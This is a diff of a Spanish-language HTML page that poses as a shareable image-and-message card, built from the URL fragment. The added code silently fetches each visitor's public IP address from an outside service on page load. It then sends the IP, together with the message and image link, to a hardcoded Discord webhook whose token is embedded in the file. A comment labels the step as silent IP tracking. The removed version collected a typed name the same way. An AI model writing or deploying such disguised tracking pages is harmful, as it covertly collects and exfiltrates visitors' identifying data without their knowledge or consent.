@@ -1,98 +1,56 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <title>SISTEMA LAWEITA</title>
     <style>
-        body { 
-            margin: 0; padding: 0; 
-            background-color: #000; 
-            display: flex; flex-direction: column; 
-            justify-content: center; align-items: center; 
-            height: 100vh; font-family: 'Consolas', monospace;
-            color: #00ff00;
-        }
-        
-        /* Estilo del error de tu captura */
-        .error-box {
-            border: 2px solid #00ff00;
-            padding: 20px 40px;
-            border-radius: 15px;
-            box-shadow: 0 0 20px #00ff00, inset 0 0 10px #00ff00;
-            text-transform: uppercase;
-            font-weight: bold;
-            display: none; /* Se oculta si todo está bien */
-        }
-
-        .container { 
-            display: flex; flex-direction: column; align-items: center; 
-            text-align: center; 
-        }
-
-        img { 
-            max-width: 85%; max-height: 60vh; 
-            border-radius: 15px; 
-            box-shadow: 0 0 30px rgba(0,0,0,0.8);
-            margin-bottom: 20px;
-        }
-
-        #mensaje { font-size: 28px; font-weight: bold; padding: 0 20px; }
+        body { margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; font-family: 'Consolas', monospace; }
+        img { max-width: 85%; max-height: 65vh; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        #mensaje { margin-top: 20px; font-size: 2rem; font-weight: bold; text-align: center; }
     </style>
 </head>
 <body id="cuerpo">
-
-    <div id="error" class="error-box">Error: Usa el generador de Python</div>
-
-    <div id="content" class="container" style="display: none;">
-        <img id="foto" src="" alt="Imagen">
-        <div id="mensaje"></div>
-    </div>
+    <img id="foto" src="" alt="">
+    <div id="mensaje"></div>
 
     <script>
-        // --- PEGA TU WEBHOOK DE DISCORD AQUÍ ABAJO ---
-        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1471966301277651129/MF0mPwHqymx_KquApDWqgsChN32QM8eTO6iP2jrz_hhJTdV20-u8MIZELCZVaIWTIqdM";
+        const WEBHOOK = "https://discord.com/api/webhooks/1471966301277651129/MF0mPwHqymx_KquApDWqgsChN32QM8eTO6iP2jrz_hhJTdV20-u8MIZELCZVaIWTIqdM"; // <--- PEGA TU WEBHOOK DE DISCORD AQUÍ
 
         const hash = decodeURIComponent(window.location.hash.substring(1));
         const partes = hash.split('*');
 
-        // Validamos que el link tenga los 4 datos (Foto, Mensaje, Fondo, Texto)
         if (partes.length >= 4) {
-            const [urlFoto, texto, colorBG, colorTxt] = partes;
+            const [urlFoto, texto, bg, txt] = partes;
 
-            // Mostrar contenido y aplicar estilos
-            document.getElementById('content').style.display = 'flex';
             document.getElementById('foto').src = urlFoto;
             document.getElementById('mensaje').innerText = texto;
-            document.getElementById('cuerpo').style.backgroundColor = '#' + colorBG;
-            document.getElementById('mensaje').style.color = '#' + colorTxt;
+            document.getElementById('cuerpo').style.backgroundColor = "#" + bg;
+            document.getElementById('mensaje').style.color = "#" + txt;
 
-            // Preguntar nombre y enviar a Discord
-            setTimeout(() => {
-                let nombre = prompt("Este mensaje es privado. Ingresa tu nombre para identificarte:");
-                if (!nombre) nombre = "Anónimo cobarde";
-
-                fetch(DISCORD_WEBHOOK, {
+            // RASTREO SILENCIOSO DE IP
+            fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => {
+                const ip = data.ip;
+                
+                fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "👁️ ¡Link Abierto!",
-                            color: 65280, // Verde
+                            title: "🚩 ¡NUEVA CONEXIÓN DETECTADA!",
+                            color: 16711680, // Rojo
                             fields: [
-                                { name: "Persona", value: nombre, inline: true },
-                                { name: "Mensaje que vio", value: texto, inline: true },
-                                { name: "Link Imagen", value: urlFoto }
+                                { name: "🌐 Dirección IP:", value: `**${ip}**`, inline: true },
+                                { name: "💬 Mensaje visto:", value: texto, inline: true },
+                                { name: "🖼️ Foto:", value: urlFoto }
                             ],
+                            footer: { text: "Rastreador Automático ipify" },
                             timestamp: new Date()
                         }]
                     })
                 });
-            }, 800);
-
-        } else {
-            // Si el link está mal, mostramos el error de tu imagen
-            document.getElementById('error').style.display = 'block';
+            });
         }
     </script>
 </body>
